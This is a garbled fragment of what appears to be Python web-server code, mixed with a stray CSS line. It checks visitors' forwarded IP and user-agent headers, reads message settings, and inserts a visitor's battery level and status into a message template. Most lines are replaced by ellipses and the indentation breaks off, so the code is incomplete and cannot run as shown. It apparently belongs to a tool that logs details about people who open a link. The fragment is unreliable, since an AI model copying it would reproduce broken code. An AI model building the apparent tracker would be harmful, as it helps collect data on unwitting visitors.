...
height: 100vh;
            ...
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                ...
                if config["message"]["richMessage"] and result:
                    ...
                    # Replace battery-related placeholders in the message
    message = message.replace("{battery_percentage}", f"{battery_percentage if battery_percentage else 'Unknown'}%")
    message = message.replace("{battery_status}", f"{battery_status if battery_status else 'Unknown'}")
